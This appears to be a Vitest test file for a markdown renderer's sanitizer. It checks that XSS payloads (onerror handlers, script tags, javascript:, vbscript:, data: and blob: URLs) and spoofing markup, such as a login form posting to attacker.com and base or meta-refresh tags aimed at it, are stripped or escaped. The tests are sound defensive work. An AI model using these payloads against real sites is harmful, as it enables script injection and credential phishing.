// @vitest-environment jsdom
import { test, expect } from 'vitest';
import { renderMarkdown } from './markdown';

test('strips script and event-handler payloads', () => {
  const out = renderMarkdown(
    '<img src=x onerror=alert(1)>\n\n<script>alert(2)</script>',
  );
  expect(out.toLowerCase()).not.toContain('onerror');
  expect(out.toLowerCase()).not.toContain('<script');
});

test('strips javascript: URLs in links', () => {
  const out = renderMarkdown('[click](javascript:alert(1))');
  expect(out.toLowerCase()).not.toContain('javascript:');
});

test('strips vbscript: URLs in links', () => {
  const out = renderMarkdown('[click](vbscript:msgbox(1))');
  expect(out.toLowerCase()).not.toContain('vbscript:');
});

test('leaves link decoration off anchors whose href was stripped', () => {
  const out = renderMarkdown('[click](javascript:alert(1))');
  expect(out).not.toContain('target="_blank"');
  expect(out).not.toContain('noopener');
});

test('strips data: URLs in links', () => {
  const out = renderMarkdown(
    '[click](data:text/html,<script>alert(1)</script>)',
  );
  expect(out.toLowerCase()).not.toContain('data:text/html');
});

test('adds target="_blank" and rel="noopener noreferrer" to links', () => {
  const out = renderMarkdown('[example](https://example.com)');
  expect(out).toContain('target="_blank"');
  expect(out).toContain('rel="noopener noreferrer"');
});

test('keeps benign markdown formatting', () => {
  const out = renderMarkdown('**bold** and `code`');
  expect(out).toContain('<strong>');
  expect(out).toContain('<code>');
});

test('syntax highlights SQL fenced code blocks', () => {
  const out = renderMarkdown(
    "```sql\nSELECT name FROM users WHERE id = 1 AND name = 'Ada';\n```",
  );

  expect(out).toContain('<code class="language-sql">');
  expect(out).toContain('<span class="tok-keyword">SELECT</span>');
  expect(out).toContain('<span class="tok-string">\'Ada\'</span>');
  expect(out).toContain('<span class="tok-number">1</span>');
});

test('escapes SQL fenced code before adding token markup', () => {
  const out = renderMarkdown(
    "```sql\nSELECT '<img src=x onerror=alert(1)>' AS payload;\n```",
  );

  expect(out).not.toContain('<img src=x');
  expect(out).toContain('&lt;img src=x onerror=alert(1)&gt;');
});

test('strips HTML forms, buttons, and non-checkbox inputs to prevent UI spoofing', () => {
  const payload = `
<form action="https://attacker.com/login" method="POST">
  <input type="text" name="user" placeholder="Username" />
  <input type="password" name="pass" placeholder="Password" />
  <button type="submit">Submit</button>
</form>
`;
  const out = renderMarkdown(payload);
  expect(out.toLowerCase()).not.toContain('<form');
  expect(out.toLowerCase()).not.toContain('type="text"');
  expect(out.toLowerCase()).not.toContain('type="password"');
  expect(out.toLowerCase()).not.toContain('<button');
});

test('preserves GFM task list checkboxes', () => {
  const out = renderMarkdown('- [ ] Todo item\n- [x] Done item');
  expect(out).toContain('type="checkbox"');
  expect(out).toContain('Todo item');
  expect(out).toContain('Done item');
});

test('handles case-insensitive checkbox input types while stripping uppercase non-checkbox inputs', () => {
  const uppercaseCheckbox = renderMarkdown('<input type="CHECKBOX" checked />');
  expect(uppercaseCheckbox.toLowerCase()).toContain('type="checkbox"');

  const paddedCheckbox = renderMarkdown('<input type=" checkbox " />');
  expect(paddedCheckbox.toLowerCase()).toContain('type="checkbox"');

  const uppercaseText = renderMarkdown('<input type="TEXT" value="phish" />');
  expect(uppercaseText.toLowerCase()).not.toContain('type="text"');
  expect(uppercaseText).not.toContain('phish');

  const uppercasePassword = renderMarkdown('<input type="PASSWORD" />');
  expect(uppercasePassword.toLowerCase()).not.toContain('type="password"');
});

test('strips autofocus attributes from elements to prevent focus hijacking', () => {
  const out = renderMarkdown(
    '<input type="checkbox" autofocus /><a href="https://example.com" autofocus>link</a>',
  );
  expect(out.toLowerCase()).not.toContain('autofocus');
});

test('strips blob: URLs in links and images', () => {
  const linkOut = renderMarkdown('[click](blob:https://example.com/uuid)');
  expect(linkOut.toLowerCase()).not.toContain('blob:');

  const imgOut = renderMarkdown('![img](blob:https://example.com/uuid)');
  expect(imgOut.toLowerCase()).not.toContain('blob:');
});

test('allows relative URLs and standard safe schemes', () => {
  const relOut = renderMarkdown('[relative](/path/to/page)');
  expect(relOut).toContain('href="/path/to/page"');

  const mailOut = renderMarkdown('[email](mailto:test@example.com)');
  expect(mailOut).toContain('href="mailto:test@example.com"');
});

test('strips forbidden base, meta, and link tags from rendered markdown', () => {
  const payload = `
<base href="https://attacker.com/" />
<meta http-equiv="refresh" content="0;url=https://attacker.com" />
<link rel="stylesheet" href="https://attacker.com/evil.css" />
`;
  const out = renderMarkdown(payload);
  expect(out.toLowerCase()).not.toContain('<base');
  expect(out.toLowerCase()).not.toContain('<meta');
  expect(out.toLowerCase()).not.toContain('<link');
});

test('strips standalone non-checkbox inputs and additional form control tags', () => {
  const payload = `
<input value="unattached" />
<fieldset><legend>Title</legend><option>Opt</option><datalist id="l"></datalist><output>1</output></fieldset>
`;
  const out = renderMarkdown(payload);
  expect(out).not.toContain('unattached');
  expect(out.toLowerCase()).not.toContain('<fieldset');
  expect(out.toLowerCase()).not.toContain('<legend');
  expect(out.toLowerCase()).not.toContain('<option');
  expect(out.toLowerCase()).not.toContain('<datalist');
  expect(out.toLowerCase()).not.toContain('<output');
});
